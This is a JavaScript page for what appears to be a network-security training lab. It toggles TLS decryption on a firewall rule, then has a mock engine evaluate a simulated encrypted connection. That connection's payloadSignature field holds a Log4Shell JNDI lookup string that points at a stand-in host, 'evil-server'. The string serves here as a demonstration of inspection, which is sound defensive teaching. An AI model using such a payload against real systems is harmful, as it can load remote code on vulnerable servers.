Lab.registerPage('ssl-decryption', {
  async render(container) {
    const body = Lab.renderLayout(container, { title: 'SSL/TLS Decryption', route: 'ssl-decryption' });
    body.innerHTML = '';

    body.appendChild(Lab.el('p', { class: 'muted' }, 'This toggles the decrypt profile on the "Allow Inspected Web Browsing" NGFW rule, then re-runs the same encrypted connection carrying a hidden exploit payload.'));

    const { 'ngfw-rules': rows } = await Lab.fetchJSON('/api/rules/ngfw');
    const rule = rows.find((r) => r.name === 'Allow Inspected Web Browsing') || rows[0];
    const statusBox = Lab.el('p', {}, rule.profile.decrypt ? 'Decrypt profile: ON' : 'Decrypt profile: OFF');

    body.appendChild(Lab.el('button', {
      onclick: async () => {
        rule.profile = { ...rule.profile, decrypt: !rule.profile.decrypt };
        await Lab.fetchJSON(`/api/rules/ngfw/${rule.id}`, { method: 'PUT', body: { profile: rule.profile } });
        statusBox.textContent = rule.profile.decrypt ? 'Decrypt profile: ON' : 'Decrypt profile: OFF';
      },
    }, 'Toggle decrypt profile'));
    body.appendChild(statusBox);
    body.appendChild(Lab.el('hr', { class: 'sep' }));

    const { interfaces } = await Lab.fetchJSON('/api/topology/interfaces');
    const { zones } = await Lab.fetchJSON('/api/topology/zones');
    const trustIface = interfaces.find((i) => zones.find((z) => z.id === i.zoneId)?.trustLevel === 'internal');

    const output = Lab.el('div', {});
    body.appendChild(Lab.el('button', {
      onclick: async () => {
        const connection = {
          protocol: 'tcp', srcIp: '10.0.0.50', srcPort: 51500, dstIp: '203.0.113.20', dstPort: 443, ingressInterfaceId: trustIface.id,
          declaredApp: 'generic-tls', encrypted: true, payloadSignature: '${jndi:ldap://evil-server/a}',
        };
        const result = await Lab.fetchJSON('/api/connection/evaluate', { method: 'POST', body: { connection, ruleset: 'ngfw' } });
        output.innerHTML = '';
        output.appendChild(Lab.renderTrace(result));
      },
    }, 'Run encrypted connection carrying a Log4Shell payload'));
    body.appendChild(output);
  },
});
